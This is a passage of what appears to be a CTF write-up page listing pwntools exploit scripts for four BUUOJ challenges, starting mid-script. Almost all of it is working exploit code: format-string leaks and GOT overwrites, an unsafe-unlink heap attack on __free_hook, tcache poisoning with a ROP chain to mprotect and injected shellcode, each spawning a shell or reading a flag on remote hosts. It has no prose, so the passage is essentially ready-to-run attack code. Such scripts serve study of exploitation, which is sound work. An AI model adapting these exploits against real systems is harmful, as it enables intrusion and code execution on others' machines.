libc</span><br><span class="line">  eax &#x3D;&#x3D; NULL</span><br><span class="line">0x5f066 execl(&quot;&#x2F;bin&#x2F;sh&quot;, [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] &#x3D;&#x3D; NULL</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">sh.sendlineafter(&#39;me:&#39;,&quot;%9$sA&quot; + p32(0x804A014))</span><br><span class="line">sh.recvuntil(&#39;Repeater:&#39;)</span><br><span class="line">printf_got &#x3D; u32(sh.recv(4))</span><br><span class="line">libc &#x3D; printf_got - 0x049020</span><br><span class="line">system &#x3D; libc + 0x03a940</span><br><span class="line">free &#x3D; libc + lib.symbols[&#39;free&#39;]</span><br><span class="line">__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">sh.sendlineafter(&#39;me:&#39;,&quot;%9$sA&quot; + p32(0x804A014 + 4 * 5))</span><br><span class="line">sh.recvuntil(&#39;Repeater:&#39;)</span><br><span class="line">__libc_start_main &#x3D; u32(sh.recv(4))</span><br><span class="line">sh.sendlineafter(&#39;me:&#39;,&quot;%9$sA&quot; + p32(0x804A030))</span><br><span class="line">sh.recvuntil(&#39;Repeater:&#39;)</span><br><span class="line">sprintf &#x3D; u32(sh.recv(4))</span><br><span class="line">one_gadget &#x3D; [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="line">log.success(&quot;sprintf: &quot; + hex(sprintf))</span><br><span class="line">log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">log.success(&quot;printf: &quot; + hex(printf_got))</span><br><span class="line">log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">payload  &#x3D;&#39;aaaaa&#39;</span><br><span class="line">payload +&#x3D; fmtstr_payload(9,&#123;0x804A014:one_gadget[0] + libc&#125;,write_size &#x3D; &quot;byte&quot;,numbwritten &#x3D; 0xe)</span><br><span class="line">sh.sendlineafter(&quot;me:&quot;,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x71-axb-2019-heap">0x71 axb_2019_heap</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn1&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	pop_rdi_ret &#x3D; elf.search(asm(&quot;pop rdi\nret&quot;)).next()</span><br><span class="line">	pop_rsi_r15_ret &#x3D; elf.search(asm(&quot;pop rsi\npop r15\nret&quot;)).next()</span><br><span class="line">	def add(idx,size,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,content)</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;4&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	chunk_list &#x3D; 0x202060</span><br><span class="line">	payload &#x3D; &#39;%14$pAA%2$pB&#39;</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	pie &#x3D; int(sh.recvuntil(&quot;AA&quot;,True),16) - (0x55d7eaef1200 - 0x55d7eaef0000)</span><br><span class="line">	libc &#x3D; int(sh.recvuntil(&quot;B&quot;,True),16) - lib.symbols[&#39;__malloc_initialize_hook&#39;] + 0x30</span><br><span class="line">	__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	add(0,0x88,&#39;\x11&#39; * 0x87)</span><br><span class="line">	add(1,0xF8,&#39;\x12&#39; * 0xF7)</span><br><span class="line">	add(2,0x18,&#39;\x13&#39; * 0x17)</span><br><span class="line">	free(0)</span><br><span class="line">	payload &#x3D; p64(0) + p64(0x81) + p64(pie + chunk_list - 0x18) + p64(pie + chunk_list - 0x10)</span><br><span class="line">	payload &#x3D; payload.ljust(0x80,&#39;\x00&#39;)</span><br><span class="line">	payload +&#x3D; p64(0x80)</span><br><span class="line">	add(0,0x88,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">	payload +&#x3D; p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">	edit(0,payload)</span><br><span class="line">	edit(0,&#39;&#x2F;bin&#x2F;sh\x00&#39; + p64(system))</span><br><span class="line">	free(0)</span><br><span class="line">        log.success(&quot;pie: &quot; + hex(pie))</span><br><span class="line">        log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">        log.success(&quot;chunk_list: &quot; + hex(pie + chunk_list))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,28825,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x72-axb-2019-fmt64">0x72 axb_2019_fmt64</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">ip &#x3D; &quot;47.108.135.45&quot;</span><br><span class="line">port &#x3D; 20023</span><br><span class="line">sh &#x3D; remote(ip, port)</span><br><span class="line">lib &#x3D; ELF(&quot;libc.so.6&quot;)</span><br><span class="line">sprintf_got &#x3D; 0x601058</span><br><span class="line">payload &#x3D; &#39;%9$sAAAA&#39; + p64(sprintf_got)</span><br><span class="line">sh.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">sprintf &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc &#x3D; sprintf - lib.symbols[&#39;sprintf&#39;]</span><br><span class="line">system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">one_gadget &#x3D; [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">system &#x3D; libc + one_gadget[0]</span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;%&#39; + str((system % 0x10000) - 9) + &#39;c%12$hn&#39;</span><br><span class="line">payload +&#x3D; &#39;%&#39; + str(((system &gt;&gt; 16) % 0x10000) - (system % 0x10000)) + &#39;c%13$hn&#39;</span><br><span class="line">payload +&#x3D; &#39;%12$s&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x20,&#39;\x00&#39;)</span><br><span class="line">payload +&#x3D; p64(sprintf_got) + p64(sprintf_got + 2)</span><br><span class="line">sh.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">addr &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x73-bytectf-2019-vip">0x73 bytectf_2019_vip</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;vip&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def vip():</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;6&quot;)</span><br><span class="line">    sh.sendafter(&#39;:&#39;,flat(&#39;a&#39;*0x20, </span><br><span class="line">    0x0000000000000020, 0x0000010101000015, </span><br><span class="line">    0x0005000000000006, 0x7fff000000000006,))</span><br><span class="line">def add(idx):</span><br><span class="line">    sh.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice:&quot;,&quot;2&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    sh.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    sh.sendline(&quot;4&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">    sh.recvuntil(&quot;Content:&quot;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;vip&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;libc-2.27.so&quot;)</span><br><span class="line">    chunk_list &#x3D; 0x404100</span><br><span class="line">    vip()</span><br><span class="line">    add(0)</span><br><span class="line">    add(1)</span><br><span class="line">    add(5)</span><br><span class="line">    add(6)</span><br><span class="line">    add(10)</span><br><span class="line">    free(6)</span><br><span class="line">    free(1)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x50 + p64(0) + p64(0x61) + p64(elf.got[&#39;free&#39;])</span><br><span class="line">    edit(0,0x70,payload)</span><br><span class="line">    add(1)</span><br><span class="line">    add(2)</span><br><span class="line">    show(2)</span><br><span class="line">    free_addr &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">    libc &#x3D; free_addr - lib.symbols[&#39;free&#39;]</span><br><span class="line">    system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">    execve &#x3D; libc + lib.symbols[&#39;execve&#39;]</span><br><span class="line">    printf &#x3D; libc + lib.symbols[&#39;printf&#39;]</span><br><span class="line">    mprotect &#x3D; libc + lib.symbols[&#39;mprotect&#39;]</span><br><span class="line">    edit(2,9,p64(printf))</span><br><span class="line">    edit(10,8,&quot;%8$p\x00&quot;)</span><br><span class="line">    free(10)</span><br><span class="line">    sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">    stack &#x3D; int(sh.recvuntil(&quot;Done!&quot;,True),16) - 8 * 13</span><br><span class="line">    payload  &#x3D; p64(libc + lib.symbols[&#39;free&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;__stack_chk_fail&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;printf&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;memset&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;prctl&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;malloc&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;setvbuf&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;open&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;perror&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;atoi&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;scanf&#39;])</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;exit&#39;])</span><br><span class="line">    payload &#x3D; payload.ljust(0x4040a0 - 0x404018,&#39;\x00&#39;)</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;_IO_2_1_stdout_&#39;]) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;_IO_2_1_stdin_&#39;]) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;_IO_2_1_stderr_&#39;])</span><br><span class="line">    payload +&#x3D; p64(0) * 7</span><br><span class="line">    payload +&#x3D; p64(stack)</span><br><span class="line">    edit(2,0x500,payload)</span><br><span class="line">    pop_rdx_ret &#x3D; 0x1b96 + libc</span><br><span class="line">    pop_rdi_ret &#x3D; 0x4018fb</span><br><span class="line">    pop_rsi_r15_ret &#x3D; 0x4018f9</span><br><span class="line">    base &#x3D; 0x404000</span><br><span class="line">    payload &#x3D; p64(pop_rdi_ret) + p64(base)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdx_ret) + p64(7)</span><br><span class="line">    payload +&#x3D; p64(mprotect)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi_ret) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_r15_ret) + p64(base + 0x800) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdx_ret) + p64(0x500)</span><br><span class="line">    payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">    payload +&#x3D; p64(base + 0x800)</span><br><span class="line">    edit(0,0x500,payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    payload &#x3D; &#39;H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm&#96;f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01\x0f\x05j\x01_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01j\x01X\x0f\x05&#39;</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    log.success(&quot;stack: &quot; + hex(stack))</span><br><span class="line">    log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node3.buuoj.cn&quot;,25165,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x74-SWPUCTF-2019-login">0x74 SWPUCTF_2019_login</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from printf_buf_not_in_stack import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;login&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    sh &#x3D; null</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;login&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;libc-2.27.so&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,&quot;a&quot;)</span><br><span class="line">    payload &#x3D; &#39;%6$pAA%15$pBB\x00&#39;</span><br><span class="line">    sh.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">    sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">    ebp &#x3D; int(sh.recvuntil(&quot;AA&quot;,True),16)</span><br><span class="line">    target_addr &#x3D; ebp - (0xffe54918 - 0xffe5490c)</span><br><span class="line">    libc &#x3D; int(sh.recvuntil(&quot;BB&quot;,True),16) - lib.symbols[&#39;__libc_start_main&#39;] - 241</span><br><span class="line">    system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    def inputMsg(msg):</span><br><span class="line">        sh.sendlineafter(&quot;!&quot;,msg)</span><br><span class="line">    ebp1_offset &#x3D; 6</span><br><span class="line">    ebp2_offset &#x3D; 10</span><br><span class="line">    written_size &#x3D; 0</span><br><span class="line">    offset &#x3D; 0</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; 0x8d29</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 2</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; 0x804</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 16</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; system % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 18</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; system &gt;&gt; 16</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 20</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; 0xbeef</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 22</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; 0xdead</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 24</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; binsh % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset &#x3D; 26</span><br><span class="line">    position &#x3D; (target_addr + offset) % 0x10000</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(position - written_size) + &quot;c%&quot; + str(ebp1_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte &#x3D; binsh &gt;&gt; 16</span><br><span class="line">    payload &#x3D; &quot;%&quot; + str(oneByte - written_size) + &quot;c%&quot; + str(ebp2_offset) + &quot;$hn\x00&quot;</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    inputMsg(&quot;wllmmllw&quot;)</span><br><span class="line">    print getCode(&quot;inputMsg&quot;)</span><br><span class="line">    log.success(&quot;ebp: &quot; + hex(ebp))</span><br><span class="line">    log.success(&quot;target_addr: &quot; + hex(target_addr))</span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">    log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node3.buuoj.cn&quot;,28300,0)</span><br></pre></td></tr></table></figure>
